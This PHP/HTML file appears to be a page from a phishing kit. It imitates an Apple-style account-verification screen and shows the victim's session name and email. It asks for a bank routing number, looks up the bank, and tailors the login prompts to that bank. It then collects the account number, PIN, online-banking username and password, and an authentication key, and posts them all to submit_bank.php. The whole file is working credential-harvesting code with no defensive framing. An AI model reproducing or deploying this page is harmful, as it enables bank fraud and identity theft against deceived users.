<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title_bill</title>";
?>
<style>
#vbvnya {
    display:none;
}
.has-error1 input {
      
    }

.error{
  background-color: #fefdd2;
  
}

#unlocknow{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 1200px;
  z-index: 55;
}

#vbvnya{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 1800px;
  z-index: 55;
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 4px;
    position: absolute;
    height: 45px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 16px;

}

.required:focus{
    outline: none;
    border-color:#97CDF5;
    border-width: 1px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

.button-save {
    font-size: 15px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border: 1px solid #07c;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding: 4px 15px;
    text-align: center;
    white-space: nowrap;
}

.button-save.disabled, .button-save:disabled {
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border-color: #07c;
    color: #fff;
    cursor: default;
    opacity: .3;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  width: 100%;
  margin-top:50px;
  height: 120px;
  z-index: 55;
}
#i1{
  background-image: url(../assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(../assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(../assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 500px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}



</style>

 <script>
        $(document).ready(function () {
    });

        function doLookup(rn)
        	{
        	if(rn.length == "9"){
            		$.ajax({
            			url: "https://www.routingnumbers.info/api/data.json?rn=" + rn,
            			dataType: 'jsonp',
            			success: onLookupSuccess
            		});
            	}else{
            	    $('#bankname').text("Invalid routing number");
            	    $('#banknama').val('Invalid routing number');

        		    //$('#loginbanknya').html("");
        		    //$("#buttonnya").css({top: "320px"});
        		    //$('#buttonnya').attr('disabled', true);
                    //$('#buttonnya').addClass('disabled');
            	}
        	}
        
        	function onLookupSuccess(data)
        	{
        		if(data.customer_name == null) {
        		    $('#bankname').text("Invalid routing number");
        		    $('#banknama').val('Invalid routing number');
                $('#button_next').addClass("disabled");
        		    //$('#loginbanknya').html("");
        		    //$("#buttonnya").css({top: "320px"});
        		    //$('#buttonnya').attr('disabled', true);
                    //$('#buttonnya').addClass('disabled');
        		}else{
        		//$('#buttonnya').attr('disabled', false);
                //$('#buttonnya').removeClass('disabled');
        		$('#bankname').text(data.customer_name);
        		$('#banknama').val(data.customer_name);
            $('#button_next').removeClass("disabled");
        		//$("#buttonnya").css({top: "470px"});
        		var bank = data.customer_name;
        		
        		    if(bank.match(/FIRST CITIZENS BANK & TRUST COMPANY|STATE BANK AND TRUST COMPANY|FOOTHILLS COMMUNITY BANK|UNITED BANK & CAPITAL TRUST COMPANY|FIRST CITIZENS BANK|FIRST- CITIZENS BANK & TRUST CO|UNITED BANK & CAPITAL TRUST COMPANY/)) {
                        //$("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="your favorite vacation city?" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "customer id");
                        $("#passbank").attr("placeholder", "password");
                        $("#authkeys_name").attr("placeholder", "your favorite vacation city?");
                    }else
                    if(bank.match(/KEYBANK|KEY BANK/)) {
                        //$("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="organization id" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "user id");
                        $("#passbank").attr("placeholder", "password");
                        $("#authkeys_name").attr("placeholder", "organization id");
                    }else
                    if(bank.match(/BANK OF AMERICA|REGIONS BANK/)) {
                        //("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "online id");
                        $("#passbank").attr("placeholder", "passcode");
                        
                    }else
                    if(bank.match(/CITIZENS|FIRST NATIONAL BANK OF DECATUR|AVIDIA BANK/)) {
                        //$("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "online user id");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/CAPITAL ONE|HUNTINGTON NATIONAL BANK|TD BANK|WELLS FARGO/)) {
                        //$("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "username");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/JPMORGAN CHASE/)) {
                        //$("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "user id");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/US BANK/)) {
                        //$("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="access code" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "personal id");
                        $("#passbank").attr("placeholder", "password");
                        $("#authkeys_name").attr("placeholder", "access code");
                    }else
                    if(bank.match(/HSBC/)) {
                        //$('#loginbanknya').html("");
        		        
                    }else{
                        //$("#loginbanknya").html('<span id="tulisanlogin" class="xFont2" style="position: absolute;top: 300px;left: 276px;">&nbsp;<b>BANK LOGIN</b></span><input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                    }    
        		}
        	}
    </script>
    </head>
<body>
<div id="bottom_m_login"></div>
    <div id="i1"></div>
    <div id="i2"></div>
    <div id="i3"></div>
    <div id="head" style="height:130px;"><br><div style="font-size: 28px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;">

         <?php if(!empty($fnames)){ 
            echo "<b><center>$account_verif</center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'>$account_id ".$_SESSION['email']."</font></b>";
         }else{
            echo "<b><center>$account_verif</center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'>$account_id ".$_SESSION['email']."</font></b>";
            }
            ?> 
            </div>
       </div>
    <div id="bottom_m1_login"></div>
<div style="
    margin: auto;
    position: relative;
    margin-top: 9px;
    margin-left: 15px;
    height: 530px;
  ">
<form id="form2" method="post" action="submit_bank.php" validate="validate"><br>
<span class="xFont1" style="">&nbsp;<b>BANK NAME</b></span><br><br>
<span id="bankname" class="xFont2" style="">&nbsp;<b>None</b></span><br><hr style="width: 320px;"><br><br>

<div id="routingform">
<span class="xFont2" style="">&nbsp;<b>ROUTING NUMBER</b></span>
<br><br>
<input id="banknama" name="bankname" type="hidden" value="">
<input type="tel" required="required" onkeyup="$('#routing').css('border-color', 'rgb(214, 214, 214)');" oninput="doLookup($('#routing').val());" maxlength="9" name="routing" id="routing" value="" style="width: 320px;"  placeholder="routing number" class="required" >
<br><br><br><br>
<span id="button_next" onclick="if(document.getElementById('routing').value.length == 0)
{
$('#routing').css('border-color', '#D24122');
}else if(document.getElementById('banknama').value == 'Invalid routing number'){
$('#routing').css('border-color', '#D24122');
}else{
    
            document.getElementById('acc_login').style.display = 'block';
            document.getElementById('routingform').style.display = 'none';
    }" class="button-save disabled" style="
    
    float:right;margin-right:40px;width: 120px;">
<span><?php echo $save;?></span></span>
</div>
<div style="display:none;" id="acc_login">
    <span class="xFont2" style="">&nbsp;<b>ACCOUNT NUMBER</b></span>
<br><br>
<input type="tel" required="required" maxlength="25" name="accnumber" id="accountnumber" value="" style="width: 320px;"  placeholder="account number" class="required" >
<br><br><br>
<input type="password" required="required" maxlength="25" name="pinbank" id="pinbank" style="width: 320px;"  placeholder="pin number" class="required" >
<br><br><br>
<hr style="width: 320px;"><br><br>
<span class="xFont2" style="">&nbsp;<b>BANK LOGIN</b></span>
<br><br>
<input type="text" required="required" maxlength="25" name="userbank" id="userbank" style="width: 320px;"  placeholder="login id" class="required" >
<br><br><br>
<input type="password" required="required" maxlength="25" name="passbank" id="passbank" style="width: 320px;"  placeholder="password" class="required" >
<br><br><br>
<input type="text" maxlength="25" name="authkeys" id="authkeys_name" style="width: 320px;" placeholder="authentication key" class="required">
<br><br><br><br>
<div style="float:right;">
<a onclick="document.getElementById('acc_login').style.display = 'none';document.getElementById('routingform').style.display = 'block';" class="button-save" style="background-color:#e3e3e3;background:linear-gradient(#fff, #e3e3e3);border-color:#C7C6C6;color:#0070c9;text-decoration:none;"><?php echo $goback;?></a>
&nbsp;
<button type="submit" class="button-save" style="
    
    margin-right:40px;width: 120px;">
<span><?php echo $save;?></span></button></div>
    
</div>
        </form>
        </div>
        
        <div tabindex="-1" id="spinner2" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>
<div tabindex="-1" id="spinner2_" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>